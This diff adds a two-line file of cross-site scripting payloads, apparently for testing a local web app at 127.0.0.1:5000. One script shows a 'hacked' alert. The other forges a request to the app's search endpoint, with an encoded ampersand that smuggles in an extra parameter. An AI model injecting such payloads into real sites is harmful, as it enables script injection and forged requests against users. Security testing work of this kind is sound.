@@ -1,0 +1,2 @@
+<script>alert('hacked')</script>
+<script>var xhttp = new XMLHttpRequest(); xhttp.open("GET", 'http://127.0.0.1:5000/search?name=devraj%26search=hahaha', false);xhttp.send();</script>
